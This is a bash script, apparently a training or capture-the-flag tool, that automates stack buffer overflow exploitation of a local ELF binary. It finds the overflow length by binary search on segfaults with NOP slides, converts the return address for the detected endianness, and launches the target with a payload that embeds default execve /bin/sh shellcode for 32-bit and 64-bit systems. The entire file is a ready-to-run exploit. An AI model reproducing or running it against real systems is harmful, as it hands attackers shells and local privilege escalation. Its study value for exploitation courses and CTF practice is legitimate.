#!/bin/bash

########################################################################
## Default  : - 64 bit                                                ##
##            - little endian                                         ##
##                                                                    ##
## required : - Address                                               ##
##                                                                    ##
## Option   : - 32 bit                                                ##
##            - big endian                                            ##
########################################################################

## AMELIORATION POSSIBLES:
##  - Compilation d'un shellcode + recup des opcodes (desassemblage) + sauvegarde dans un fichier

# define all the options (small after "-o", big after --long)
OPTS=`getopt -o bdhls:v --long 32,64,big-endian,little-endian,help,shellcode,verbose,debug,debug-no-env -n 'parse-options' -- "$@"`
eval set -- "$OPTS"

# could not parse the options
if [ $? != 0 ]
then
  echo "Failed parsing options." >&2
  exit 1
fi

# parse the options and assign corresponding var
while true; do
  case "$1" in
    -b | --big-endian ) BIG_ENDIAN=true; shift ;;
    -d | --debug ) DEBUG=true; shift ;;
    --debug-no-env) DEBUG=true; NOENV=true; shift ;;
    -h | --help ) HELP=true; shift ;;
    -l | --little-endian ) LITTLE_ENDIAN=true; shift ;;
    --32 ) BIT32=true; shift ;;
    --64 ) BIT64=true; shift ;;
    -s | --SHELLCODE ) SHELLCODE="$2"; shift; shift ;;
    -v | --verbose ) VERBOSE=true; shift ;;
    -- ) shift; break ;;
    * ) break ;;
  esac
done

# Check that we have given the required params
if [ "$#" -lt 2 ]
then
  echo "USAGE: ./exploit.sh [options] <TARGET_FILE> <ADDRESS>"
  exit 1
fi

if [ $VERBOSE ]; then
  echo '#########################################################'
  echo '##      ____             _         ____      ____      ##'
  echo '##     / __ )____ ______(_)____   /  _/___  / __/___   ##'
  echo '##    / __  / __ `/ ___/ / ___/   / // __ \/ /_/ __ \  ##'
  echo '##   / /_/ / /_/ (__  ) / /__   _/ // / / / __/ /_/ /  ##'
  echo '##  /_____/\__,_/____/_/\___/  /___/_/ /_/_/  \____/   ##'
  echo '##                                                     ##'
  echo '#########################################################'
  echo ""
fi

# assign the 2nd last arg as the target
target=${@: -2: 1}

# if a file is given, take the content as the shellcode
if [ $SHELLCODE ] && [[ -f $SHELLCODE ]]; then
  if [ $VERBOSE ]; then
    echo "Path given for shellcode, reading content of $SHELLCODE"
  fi
  SHELLCODE="$(cat $SHELLCODE)"
fi

if [ $SHELLCODE ] && [ $VERBOSE ]; then
  echo "SHELLCODE=\"$SHELLCODE\""
  echo ""
elif [ $VERBOSE ]; then
  echo "Using default shellcode"
  echo ""
fi



######################################################################
##      ___              __       _____      __  __  _              ##
##     /   |  __________/ /_     / ___/___  / /_/ /_(_)___  ____ _  ##
##    / /| | / ___/ ___/ __ \    \__ \/ _ \/ __/ __/ / __ \/ __ `/  ##
##   / ___ |/ /  / /__/ / / /   ___/ /  __/ /_/ /_/ / / / / /_/ /   ##
##  /_/  |_/_/   \___/_/ /_/   /____/\___/\__/\__/_/_/ /_/\__, /    ##
##                                                       /____/     ##
######################################################################

if [ -z $BIT32 ] && [ -z $BIT64 ]; then

  if file $target | grep -q 'ELF 32'; then
    BIT32=tue
  elif file $target | grep -q 'ELF 64'; then
    BIT64=true
  fi

  if [ -z $BIT32 ] && [ -z $BIT64 ]; then
    echo "Could not get file arch"
    exit 1
  fi
fi

if [ $BIT32 ]; then
  ebp="\x90\x90\x90\x90"
  arch="32"
  address="$(printf '%8s' ${@: -1} | tr [:space:] "0")"
  if [ -z $SHELLCODE ]; then
    SHELLCODE='\x31\xdb\x8d\x43\x17\x99\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
    LEN=$(echo -n -e $SHELLCODE | wc -c)
  fi
elif [ $BIT64 ]; then
  ebp="\x90\x90\x90\x90\x90\x90\x90\x90"
  arch="64"
  address="$(printf '%16s' ${@: -1} | tr [:space:] "0")"
  if [ -z $SHELLCODE ]; then
    SHELLCODE='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    LEN=$(echo -n -e $SHELLCODE | wc -c)
  fi
fi

if [ $VERBOSE ]; then
  echo "Architecture was $arch bit, so ebp is set to: $ebp ($(($arch/8)) characters)"
  if [ $LEN ]; then
    echo ""
    echo "SHELLCODE length: $LEN"
    echo "SHELLCODE=\"$SHELLCODE\""
  fi
fi



#####################################################################################################
##      ___       __    __                       ____                           __  _              ##
##     /   | ____/ /___/ /_______  __________   / __/___  _________ ___  ____ _/ /_(_)___  ____ _  ##
##    / /| |/ __  / __  / ___/ _ \/ ___/ ___/  / /_/ __ \/ ___/ __ `__ \/ __ `/ __/ / __ \/ __ `/  ##
##   / ___ / /_/ / /_/ / /  /  __(__  |__  )  / __/ /_/ / /  / / / / / / /_/ / /_/ / / / / /_/ /   ##
##  /_/  |_\__,_/\__,_/_/   \___/____/____/  /_/  \____/_/  /_/ /_/ /_/\__,_/\__/_/_/ /_/\__, /    ##
##                                                                                      /____/     ##
#####################################################################################################

if [ -n "$BIG_ENDIAN" ]; then
  address=$address
  if [ $VERBOSE ]; then
    echo "Address in Big Endian: $address"
  fi
elif [ -n "$LITTLE_ENDIAN" ]; then
  # Get last param and transform it to little endian
  address="$(echo $address | tac -rs .. | echo "$(tr -d '\n')")"
  if [ $VERBOSE ]; then
    echo "Address in Little Endian: $address"
  fi
else
  endian="$(echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6)"
  if [ "$endian" ]; then
    address="$(echo $address | tac -rs .. | echo "$(tr -d '\n')")"
  fi
  if [ $VERBOSE ]; then
    name=("big" "little")
    echo "${name[$endian]} endian detected"
    echo "Address is: $address"
  fi
fi

newaddr=""
length="$(expr length $address)"
length=$(($length-1))
# Format address so it have a \x every two char
for i in $(seq 0 2 $length)
do
  newaddr="$newaddr\x${address:i:2}"
done

if [ $VERBOSE ]; then
  echo "Address in hexadecimal: \"$newaddr\""
  echo ""
fi

##############################################
##      ________  _______ _____   ________  ##
##     / ____/ / / / ___//  _/ | / / ____/  ##
##    / /_  / / / /\__ \ / //  |/ / / __    ##
##   / __/ / /_/ /___/ // // /|  / /_/ /    ##
##  /_/    \____//____/___/_/ |_/\____/     ##
##                                          ##
##############################################

if [ $VERBOSE ]; then
  echo ""
  echo ""
  echo ""
  echo ""
  echo '##############################################'
  echo '##      ________  _______ _____   ________  ##'
  echo '##     / ____/ / / / ___//  _/ | / / ____/  ##'
  echo '##    / /_  / / / /\__ \ / //  |/ / / __    ##'
  echo '##   / __/ / /_/ /___/ // // /|  / /_/ /    ##'
  echo '##  /_/    \____//____/___/_/ |_/\____/     ##'
  echo '##                                          ##'
  echo '##############################################'
  echo ""
fi

min=0
max=10
current=10

while true
do

  # print $current times a \x90 char
  slide="$(printf "\\\x90%0.s" $(seq 1 $current))"

  if [ $VERBOSE ]; then
    echo "Min: $min"
    echo "Max: $max"
    echo "Current: $current"
    $($target "$(echo -n -e "$slide")" 2>/dev/null) 2>/dev/null
    ret=$?
  else
    $($target "$(echo -n -e "$slide")" 2>&1 1>/dev/null) 2>/dev/null
    ret=$?
  fi

  # Si min est max sont à 1 d'équart, nous avons trouver notre nombre
  if [ $min -eq $(($max-1)) ]
  then
    break

  # Pas de segfault
  elif [ $ret -ne 139 ]
  then

    # Nous sommes dans le cas où nous avons déjà trouvé le maximum
    # mais que le nombre recherché est plus grand que le current

    # Nous allons donc déplacer le minimum au current et le current
    # à la moitier de l'interval current <=> max
    if [ $current -lt $max ]
    then
      min=$current
      current=$(($current+(($max-$current)/2)))

    # Nous n'avons pas encore trouvé le maximum
    else
      min=$current
      current=$(($current*2))
      max=$current
    fi


  # Il y a une segfault
  else
    if [ $VERBOSE ]; then
      echo "Segfault detected at current=$current"
    fi

    # Nous sommes dans le cas où le maximum à déjà été trouvé
    # mais que le nombre recherché est plus petit que le current

    # Nous allons donc déplacer le maximum au curent et le current
    # à la moitier de l'interval min <=> current
    if [ $current -lt $max ]
    then
      max=$current
      current=$(($min+(($max-$min)/2)))
    else
      current=$(($current-$current/4))
    fi
  fi
  if [ $VERBOSE ]; then
    echo ""
  fi
done

# Si nous avons la place de mettre notre shellcode dans le buffer
if [ $BIT64 ] && (( ${#slide} >= ${#SHELLCODE} + ${#ebp} )); then
  if [ $VERBOSE ]; then
    echo -e "\nThere is enough space for the shellcode in the buffer\nPutting Shellcode inside buffer"
  fi
  slide=${slide:0:-((${#SHELLCODE} + ${#ebp}))}
  exec=$slide$SHELLCODE$ebp$newaddr
elif [ $BIT32 ] && (( ${#slide} >= ${#SHELLCODE} )); then
  if [ $VERBOSE ]; then
    echo -e "\nThere is enough space for the shellcode in the buffer\nPutting Shellcode inside buffer"
  fi
  slide="$slide\x90"
  slide=${slide:0:-${#SHELLCODE}}
  exec=$slide$SHELLCODE$ebp$newaddr
else
  if [ $VERBOSE ]; then
    echo -e "\nThere isn't enough space for shellcode in the buffer\nPutting Shellcode after buffer"
  fi
  if [ $BIT32 ]; then
    slide="$slide\x90"
  fi
  # adding a second slide to make it easier to get the starting address (in case of forbidden char for example)
  second_slide="$(printf "\\\x90%0.s" $(seq 1 64))"
  exec=$slide$ebp$newaddr$second_slide$SHELLCODE
fi




if [ $DEBUG ]; then
  target="gdb --args "$target""

  if [ $NOENV ]; then
    target="env - $target"
  fi

  if [ $VERBOSE ]; then
    echo ""
    echo ""
    echo ""
    echo '########################################'
    echo '##      ____       __                 ##'
    echo '##     / __ \___  / /_  __  ______ _  ##'
    echo '##    / / / / _ \/ __ \/ / / / __ `/  ##'
    echo '##   / /_/ /  __/ /_/ / /_/ / /_/ /   ##'
    echo '##  /_____/\___/_.___/\__,_/\__, /    ##'
    echo '##                         /____/     ##'
    echo '########################################'
  fi
fi

if [ $VERBOSE ]; then
  echo ""
  echo -n "Total size: "
  echo -n -e "$exec" | wc -c
  echo ""
  echo "full param: \"$exec\""
  $target "$(echo -n -e "$exec")"
else
  $target "$(echo -n -e "$exec")"
fi
